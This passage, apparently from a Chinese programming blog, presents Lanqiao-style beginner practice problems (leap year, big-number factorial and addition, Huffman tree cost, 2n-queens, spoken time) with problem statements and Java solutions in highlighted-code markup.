class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">给定一个年份，判断这一年是不是闰年。</span><br><span class="line"></span><br><span class="line">当以下情况之一满足时，这一年是闰年：</span><br><span class="line"></span><br><span class="line">1. 年份是4的倍数而不是100的倍数；</span><br><span class="line"></span><br><span class="line">2. 年份是400的倍数。</span><br><span class="line"></span><br><span class="line">其他的年份都不是闰年。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入包含一个整数y，表示当前的年份。</span><br><span class="line">输出格式</span><br><span class="line">输出一行，如果给定的年份是闰年，则输出yes，否则输出no。</span><br><span class="line">说明：当试题指定你输出一个字符串作为结果（比如本题的yes或者no，你需要严格按照试题中给定的大小写，写错大小写将不得分。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">2013</span><br><span class="line">样例输出</span><br><span class="line">no</span><br><span class="line">样例输入</span><br><span class="line">2016</span><br><span class="line">样例输出</span><br><span class="line">yes</span><br><span class="line">数据规模与约定</span><br><span class="line">1990 &lt;= y &lt;= 2050。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> year = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((year%<span class="number">4</span> == <span class="number">0</span> &amp;&amp; year%<span class="number">100</span> !=<span class="number">0</span>) || (year%<span class="number">400</span> == <span class="number">0</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">"yes"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"no"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-30-阶乘计算"><a href="#BASIC-30-阶乘计算" class="headerlink" title="BASIC-30 阶乘计算"></a>BASIC-30 阶乘计算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　输入一个正整数n，输出n!的值。</span><br><span class="line">　　其中n!=1*2*3*…*n。</span><br><span class="line">算法描述</span><br><span class="line">　　n!可能很大，而计算机能表示的整数范围有限，需要使用高精度计算的方法。使用一个数组A来表示一个大整数a，A[0]表示a的个位，A[1]表示a的十位，依次类推。</span><br><span class="line">　　将a乘以一个整数k变为将数组A的每一个元素都乘以k，请注意处理相应的进位。</span><br><span class="line">　　首先将a设为1，然后乘2，乘3，当乘到n时，即得到了n!的值。</span><br><span class="line">输入格式</span><br><span class="line">　　输入包含一个正整数n，n&lt;=1000。</span><br><span class="line">输出格式</span><br><span class="line">　　输出n!的准确值。</span><br><span class="line">样例输入</span><br><span class="line">10</span><br><span class="line">样例输出</span><br><span class="line">3628800</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">法一：</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        BigInteger a = BigInteger.valueOf(n);</span><br><span class="line">        BigInteger b = BigInteger.ONE;</span><br><span class="line">        BigInteger s = BigInteger.ONE;</span><br><span class="line">        <span class="keyword">for</span>(BigInteger i = BigInteger.ONE;i.compareTo(a)&lt;=<span class="number">0</span>;i=i.add(b))&#123;</span><br><span class="line">            s=s.multiply(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">法二：</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (n &gt; <span class="number">1000</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> sum[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10000</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sum.length; i++) &#123;</span><br><span class="line">            sum[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; sum.length; j++) &#123;</span><br><span class="line">                sum[j] = sum[j] * i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; sum.length; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sum[k] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> kinwei = sum[k] / <span class="number">10</span>;</span><br><span class="line">                    sum[k + <span class="number">1</span>] += kinwei;</span><br><span class="line">                    sum[k] = sum[k] % <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = sum.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sum[i] != <span class="number">0</span>)</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print(sum[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-29-高精度加法"><a href="#BASIC-29-高精度加法" class="headerlink" title="BASIC-29 高精度加法"></a>BASIC-29 高精度加法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　输入两个整数a和b，输出这两个整数的和。a和b都不超过100位。</span><br><span class="line">算法描述</span><br><span class="line">　　由于a和b都比较大，所以不能直接使用语言中的标准数据类型来存储。对于这种问题，一般使用数组来处理。</span><br><span class="line">　　定义一个数组A，A[0]用于存储a的个位，A[1]用于存储a的十位，依此类推。同样可以用一个数组B来存储b。</span><br><span class="line">　　计算c = a + b的时候，首先将A[0]与B[0]相加，如果有进位产生，则把进位（即和的十位数）存入r，把和的个位数存入C[0]，即C[0]等于(A[0]+B[0])%10。然后计算A[1]与B[1]相加，这时还应将低位进上来的值r也加起来，即C[1]应该是A[1]、B[1]和r三个数的和．如果又有进位产生，则仍可将新的进位存入到r中，和的个位存到C[1]中。依此类推，即可求出C的所有位。</span><br><span class="line">　　最后将C输出即可。</span><br><span class="line">输入格式</span><br><span class="line">　　输入包括两行，第一行为一个非负整数a，第二行为一个非负整数b。两个整数都不超过100位，两数的最高位都不是0。</span><br><span class="line">输出格式</span><br><span class="line">　　输出一行，表示a + b的值。</span><br><span class="line">样例输入</span><br><span class="line">20100122201001221234567890</span><br><span class="line">2010012220100122</span><br><span class="line">样例输出</span><br><span class="line">20100122203011233454668012</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        BigInteger a = in.nextBigInteger();</span><br><span class="line">        BigInteger b = in.nextBigInteger();</span><br><span class="line">        System.out.println(a.add(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-28-Huffuman树"><a href="#BASIC-28-Huffuman树" class="headerlink" title="BASIC-28 Huffuman树"></a>BASIC-28 Huffuman树</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　Huffman树在编码中有着广泛的应用。在这里，我们只关心Huffman树的构造过程。</span><br><span class="line">　　给出一列数&#123;pi&#125;=&#123;p0, p1, …, pn-1&#125;，用这列数构造Huffman树的过程如下：</span><br><span class="line">　　1. 找到&#123;pi&#125;中最小的两个数，设为pa和pb，将pa和pb从&#123;pi&#125;中删除掉，然后将它们的和加入到&#123;pi&#125;中。这个过程的费用记为pa + pb。</span><br><span class="line">　　2. 重复步骤1，直到&#123;pi&#125;中只剩下一个数。</span><br><span class="line">　　在上面的操作过程中，把所有的费用相加，就得到了构造Huffman树的总费用。</span><br><span class="line">　　本题任务：对于给定的一个数列，现在请你求出用该数列构造Huffman树的总费用。</span><br><span class="line"></span><br><span class="line">　　例如，对于数列&#123;pi&#125;=&#123;5, 3, 8, 2, 9&#125;，Huffman树的构造过程如下：</span><br><span class="line">　　1. 找到&#123;5, 3, 8, 2, 9&#125;中最小的两个数，分别是2和3，从&#123;pi&#125;中删除它们并将和5加入，得到&#123;5, 8, 9, 5&#125;，费用为5。</span><br><span class="line">　　2. 找到&#123;5, 8, 9, 5&#125;中最小的两个数，分别是5和5，从&#123;pi&#125;中删除它们并将和10加入，得到&#123;8, 9, 10&#125;，费用为10。</span><br><span class="line">　　3. 找到&#123;8, 9, 10&#125;中最小的两个数，分别是8和9，从&#123;pi&#125;中删除它们并将和17加入，得到&#123;10, 17&#125;，费用为17。</span><br><span class="line">　　4. 找到&#123;10, 17&#125;中最小的两个数，分别是10和17，从&#123;pi&#125;中删除它们并将和27加入，得到&#123;27&#125;，费用为27。</span><br><span class="line">　　5. 现在，数列中只剩下一个数27，构造过程结束，总费用为5+10+17+27=59。</span><br><span class="line">输入格式</span><br><span class="line">　　输入的第一行包含一个正整数n（n&lt;=100）。</span><br><span class="line">　　接下来是n个正整数，表示p0, p1, …, pn-1，每个数不超过1000。</span><br><span class="line">输出格式</span><br><span class="line">　　输出用这些数构造Huffman树的总费用。</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">5 3 8 2 9</span><br><span class="line">样例输出</span><br><span class="line">59</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            arr[i] = in.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;i+<span class="number">1</span>&lt;arr.length;)&#123;</span><br><span class="line">            Arrays.sort(arr);</span><br><span class="line">            <span class="keyword">int</span> temp = arr[i] + arr[i+<span class="number">1</span>];</span><br><span class="line">            arr[i+<span class="number">1</span>] = temp;</span><br><span class="line">            sum+=temp;</span><br><span class="line">            <span class="comment">// [i+1,arr.length-1]</span></span><br><span class="line">            arr = Arrays.copyOfRange(arr,i+<span class="number">1</span>,arr.length);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-27-2n皇后问题"><a href="#BASIC-27-2n皇后问题" class="headerlink" title="BASIC-27 2n皇后问题"></a>BASIC-27 2n皇后问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定一个n*n的棋盘，棋盘中有一些位置不能放皇后。现在要向棋盘中放入n个黑皇后和n个白皇后，使任意的两个黑皇后都不在同一行、同一列或同一条对角线上，任意的两个白皇后都不在同一行、同一列或同一条对角线上。问总共有多少种放法？n小于等于8。</span><br><span class="line">输入格式</span><br><span class="line">　　输入的第一行为一个整数n，表示棋盘的大小。</span><br><span class="line">　　接下来n行，每行n个0或1的整数，如果一个整数为1，表示对应的位置可以放皇后，如果一个整数为0，表示对应的位置不可以放皇后。</span><br><span class="line">输出格式</span><br><span class="line">　　输出一个整数，表示总共有多少种放法。</span><br><span class="line">样例输入</span><br><span class="line">4</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">样例输出</span><br><span class="line">2</span><br><span class="line">样例输入</span><br><span class="line">4</span><br><span class="line">1 0 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">样例输出</span><br><span class="line">0</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span>[] w_place;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span>[] b_place;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span>[][] arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        n = in.nextInt();</span><br><span class="line">        w_place = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        b_place = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输入矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">                arr[i][j] = in.nextInt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递归回溯</span></span><br><span class="line">        backdate(<span class="number">0</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递归回溯</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">backdate</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;n-<span class="number">1</span>)&#123;</span><br><span class="line">            result++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理第i个白皇后</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> w = <span class="number">0</span>;w &lt; n;w++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(checkWhite(i,w))&#123;</span><br><span class="line">                w_place[i] = w;</span><br><span class="line">                arr[i][w] = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// 处理第i个黑皇后(第i个白皇后有位置放时，才考虑第i个黑皇后)</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> b = <span class="number">0</span>;b &lt; n;b++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(checkBlack(i,b))&#123;</span><br><span class="line">                        b_place[i] = b;</span><br><span class="line">                        arr[i][b] = <span class="number">0</span>;</span><br><span class="line">                        <span class="comment">// 递归</span></span><br><span class="line">                        backdate(i+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 回溯</span></span><br><span class="line">                        arr[i][b] = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                arr[i][w] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 白皇后</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkWhite</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k &lt; i;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j==w_place[k] || Math.abs(i-k) == Math.abs(j-w_place[k]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 黑皇后</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkBlack</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k &lt; i;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j == b_place[k] || Math.abs(i-k) == Math.abs(j-b_place[k]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-26-报时助手"><a href="#BASIC-26-报时助手" class="headerlink" title="BASIC-26 报时助手"></a>BASIC-26 报时助手</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定当前的时间，请用英文的读法将它读出来。</span><br><span class="line">　　时间用时h和分m表示，在英文的读法中，读一个时间的方法是：</span><br><span class="line">　　如果m为0，则将时读出来，然后加上“o&apos;clock”，如3:00读作“three o&apos;clock”。</span><br><span class="line">　　如果m不为0，则将时读出来，然后将分读出来，如5:30读作“five thirty”。</span><br><span class="line">　　时和分的读法使用的是英文数字的读法，其中0~20读作：</span><br><span class="line">　　0:zero, 1: one, 2:two, 3:three, 4:four, 5:five, 6:six, 7:seven, 8:eight, 9:nine, 10:ten, 11:eleven, 12:twelve, 13:thirteen, 14:fourteen, 15:fifteen, 16:sixteen, 17:seventeen, 18:eighteen, 19:nineteen, 20:twenty。</span><br><span class="line">　　30读作thirty，40读作forty，50读作fifty。</span><br><span class="line">　　对于大于20小于60的数字，首先读整十的数，然后再加上个位数。如31首先读30再加1的读法，读作“thirty one”。</span><br><span class="line">　　按上面的规则21:54读作“twenty one fifty four”，9:07读作“nine seven”，0:15读作“zero fifteen”。</span><br><span class="line">输入格式</span><br><span class="line">　　输入包含两个非负整数h和m，表示时间的时和分。非零的数字前没有前导0。h小于24，m小于60。</span><br><span class="line">输出格式</span><br><span class="line">　　输出时间时刻的英文。</span><br><span class="line">样例输入</span><br><span class="line">0 15</span><br><span class="line">样例输出</span><br><span class="line">zero fifteen</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 